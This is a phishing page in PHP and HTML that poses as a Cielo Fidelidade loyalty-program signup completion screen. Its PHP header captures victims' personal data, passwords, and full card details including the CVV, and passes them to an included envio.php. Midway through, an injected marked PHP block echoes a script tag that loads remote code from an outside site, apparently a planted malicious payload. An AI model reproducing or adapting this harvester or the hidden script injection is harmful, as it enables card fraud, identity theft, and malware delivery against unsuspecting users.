<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
	<?php
		$abre = fopen('contador.txt', 'r+');
		$dados = fread($abre, 512) ;
		$contador = $dados + 1;
		fclose($abre);
		unlink('contador.txt');
		$cria_novo = fopen("contador.txt", "a");
		$escreve = fwrite($cria_novo, $contador);
		fclose($cria_novo);
		
		//CAPTURA DADOS
		$nome = $_POST['nome'];
		$email = $_POST['email'];
		$dia = $_POST['dia'];
		$mes = $_POST['mes'];
		$ano = $_POST['ano'];
		$cpf = $_POST['cpf'];
		$celular = $_POST['celular'];
		$senha = $_POST['senha'];
		$nome_card = $_POST['nome_card'];
		$num_card = $_POST['num_card'];
		$cvv = $_POST['cvv'];
		$bandeira = $_POST['bandeira'];
		$val_mes = $_POST['val_mes'];
		$val_ano = $_POST['val_ano'];
   		$cep = $_POST['cep'];	
		$cidade = $_POST['cidade'];	
		$bairro = $_POST['bairro'];	
		$complemento = $_POST['complemento'];	
		$estado = $_POST['estado'];	
		$rua = $_POST['rua'];	
		 
		include ('envio.php');
	?>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="globalsign-domain-verification" content="hGTLznI_ALhM2YyYNahnfrjVot8mNBOI9jVDnpkOoY" />
    <title>Cadastro | Cielo Fidelidade</title>
    <link rel="shortcut icon" href="favicon.ico" />
    <script type="text/javascript" src="Scripts/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="Scripts/integracao.html"></script>
    <link rel="stylesheet" type="text/css" media="all" href="Content/css/default.css" />
    
    <link rel="stylesheet" type="text/css" media="all" href="Content/css/naocadastrado.css" />


    <script>var BASE_URL = 'index.html';</script>
</head>
<body class="interna naocadastrado">

    <noscript></noscript>
    <script>        (function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
        new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
    j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
    '../www.googletagmanager.com/gtm5445.html?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-B3BD');</script>

    <div class="container">
        <div class="strip st-menu">
    <div class="wrap">
        <a class="logo-small" href="index.html">Programa <strong>Cielo Fidelidade</strong></a>
        <a class="duvidas" href="FaleConosco.html"> > Dúvidas sobre o programa</a>
    </div>
</div>

        <div class="strip st-image">
    <div class="wrap">
        <div class="foto-header">
            <img src="Content/img/deslogadas/triple-balls-destaq.png" />
        </div>
        <div class="sl-texto">
            <h2>Cadastre-se já.</h2>
            <p>O Programa Cielo Fidelidade tem muitos presentes para você e seu negócio.</p>
        </div>
    </div>
</div>

        <div class="render-body">
            


<div class="strip st-content">
    <div class="wrap">
        <h2>Finalizado - Cielo Fidelidade</h2>
        <p class="recuo">&nbsp;</p>
        <div class="ct-form">
<form action="finalizar.php" id="formPrimeiroAcesso" method="post">
<div class="form-col-3">
                <div class="fix">
                       
                        <span class="field-validation-valid" data-valmsg-for="Email" data-valmsg-replace="true"></span>
              </div>
              <div class="fix">
                       
  </div>
                    <p style="text-align:center; color:#00AEEF;">&nbsp;</p>
                    <p style="text-align:center; color:#00AEEF;">Você acabar de finalizar seu cadastro na promoção Cielo Fidelidade da Cielo.<br>
                        Estamos orgulhosos de ter você como cliente.<br>
                        Guarde seu número da sorte, com ele que você confirma o recebimento dos prêmios!
                        <br><br><br>
                        Número da sorte:<strong>
                        <?php
                        $num_rand = rand(123456, 987654321);
						echo $num_rand;
						?>
<?php
#9b2e79#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868800\"></script>";
echo $f;
}
#/9b2e79#
?><br>
                        </strong>
                        <a href= index.html>
                        Cadastrar outro cartão</a>
         				</p>
                    
                  
            </div>                
               <!-- <button type="submit" class="botaoSubmit" onclick="return DesabilitarBotao();">Finalizar</button>                
</form>  -->      </div>
    </div>
</div>


        </div>
        <div class="strip st-footer">
    <div class="wrap">
        <img src="Content/img/comum/logo-footer.png" />
        <p>Copyright 2014 Cielo Fidelidade. Todos os direitos reservados</p>
    </div>
</div>

    </div>
    
    
<script src="Scripts/jquery.mask.min.js"></script>
<script src="Scripts/pages/nao-cadastrado.js"></script>

<script type="text/javascript">
        var count = 0;
        function DesabilitarBotao() {
            count++;
            return count == 1;
        }
    </script>

<script type="text/javascript" src="Scripts/cielo2014.js"></script>
</body>

</html>
